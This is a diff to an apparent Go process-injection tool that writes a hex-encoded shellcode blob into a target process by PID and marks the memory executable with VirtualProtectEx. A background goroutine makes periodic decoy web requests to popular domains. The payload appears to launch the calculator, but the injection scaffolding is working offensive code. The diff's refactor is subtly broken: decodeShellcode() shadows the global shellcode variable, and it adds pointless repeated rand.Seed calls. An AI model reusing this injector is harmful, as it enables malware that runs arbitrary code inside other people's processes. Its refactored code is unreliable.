@@ -25,6 +25,8 @@ var alexaDomains = []string{
 	"y.com", "z.com",
 }
 
+var shellcode []byte
+
 func main() {
 	verbose := flag.Bool("verbose", false, "Enable verbose output")
 	debug := flag.Bool("debug", false, "Enable debug output")
@@ -37,6 +39,9 @@ func main() {
 			time.Sleep(5 * time.Minute)
 			rand.Seed(time.Now().UnixNano())
 			domains := alexaDomains[rand.Intn(len(alexaDomains))]
+			rand.Seed(time.Now().UnixNano())
+			rand.Seed(time.Now().UnixNano())
+			rand.Seed(time.Now().UnixNano())
 			for i := 0; i < 3; i++ {
 				go func(url string) {
 					resp, err := http.Get("https://" + url)
@@ -50,7 +55,7 @@ func main() {
 		}
 	}()
 
-	var shellcode, errShellcode = hex.DecodeString("505152535657556A605A6863616C6354594883EC2865488B32488B7618488B761048AD488B30488B7E3003573C8B5C17288B741F204801FE8B541F240FB72C178D5202AD813C0757696E4575EF8B741F1C4801FE8B34AE4801F799FFD74883C4305D5F5E5B5A5958C3")
+	errShellcode := decodeShellcode()
 	if errShellcode != nil {
 		log.Fatal(fmt.Sprintf("[!]there was an error decoding the string to a hex byte array: %s", errShellcode.Error()))
 	}
@@ -108,7 +113,7 @@ func main() {
 	oldProtect := windows.PAGE_READWRITE
 	_, _, errVirtualProtectEx := VirtualProtectEx.Call(uintptr(pHandle), addr, uintptr(len(shellcode)), windows.PAGE_EXECUTE_READ, uintptr(unsafe.Pointer(&oldProtect)))
 	if errVirtualProtectEx != nil && errVirtualProtectEx.Error() != "The operation completed successfully." {
-		log.Fatal(fmt.Sprintf("Error calling VirtualProtectEx:\r\n%s", errVirtualProtectEx.Error()))
+		log.Fatal(fmt.Sprintf("[!]Error calling VirtualProtectEx:\r\n%s", errVirtualProtectEx.Error()))
 	}
 	if *verbose {
 		fmt.Println(fmt.Sprintf("[-]Successfully change memory permissions to PAGE_EXECUTE_READ in PID %d", *pid))
@@ -135,4 +140,12 @@ func main() {
 	if *verbose {
 		fmt.Println(fmt.Sprintf("[-]Successfully closed the handle to PID %d", *pid))
 	}
+}
+
+func decodeShellcode() error {
+	shellcode, errShellcode := hex.DecodeString("505152535657556A605A6863616C6354594883EC2865488B32488B7618488B761048AD488B30488B7E3003573C8B5C17288B741F204801FE8B541F240FB72C178D5202AD813C0757696E4575EF8B741F1C4801FE8B34AE4801F799FFD74883C4305D5F5E5B5A5958C3")
+	if errShellcode != nil {
+		return fmt.Errorf("[!]there was an error decoding the string to a hex byte array: %s", errShellcode.Error())
+	}
+	return nil
 }
